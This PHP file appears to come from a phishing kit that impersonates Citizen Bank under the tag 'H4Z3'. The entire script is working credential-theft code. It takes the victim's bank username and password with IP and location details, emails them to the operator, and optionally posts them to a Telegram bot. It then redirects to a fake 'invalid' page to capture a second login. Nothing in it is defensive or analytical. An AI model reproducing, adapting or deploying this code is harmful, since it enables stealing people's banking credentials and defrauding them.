<?php
include '../settings.php';
include 'functions.php';

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $username = $_POST['username'];
    $password = $_POST['password'];
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    $ip = getenv("REMOTE_ADDR");

    h4z3_store_submission('login', $_POST);
    
            $body  = "++++++++++ 🐱‍💻 CITIZEN BANK LOGIN 1 🐱‍💻 ++++++++++\r\n";
            $body .= "Username    : $username\r\n";
            $body .= "Password    : $password\r\n";
            $body .= "|--------------- I N F O | I P -------------------|\r\n";
            $body .= "IP          : $ip\r\n";
            $body .= "User Agent  : $user_agent\r\n";
            $body .= "Country     : $cn\r\n";
            $body .= "Region      : $regioncity\r\n";
            $body .= "City        : $citykota\r\n";
            $body .= "OS / BR     : $os / $br\r\n";
            $body .= "Timezone    : $timezone\r\n";
            $body .= "Date        : $date\r\n";
            $body .= "+++++++++++++++ ‍H4Z3 +++++++++++++++\r\n";
    

      $subject  = "🐱‍💻 ‍H4Z3 CITIZEN BANK LOGIN INFO 1 => FROM $ip 🐱‍💻";
      $headers  = "From: 🐱‍💻 ‍H4Z3 🐱‍💻 <m4r1ju4n4r3sult@h4z3.com>\r\n";
      $headers .= "MIME-Version: 1.0\r\n"; 
      $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    mail($to,$subject,$body,$headers);

    if($tgresult == "on"){
        require"$data";
        $data = $body;
          $send = ['chat_id'=>$chatid,'text'=>$data];
          $website = "https://api.telegram.org/{$boturl}";
          $ch = curl_init($website . '/sendMessage');
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POST, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
          $result = curl_exec($ch);
          curl_close($ch);
        }
  if($doublelogin == "on"){
    header('Location: ../invalid');
    exit;
  }
  else{
    header('Location: ../security');
    exit;
  }
}
?>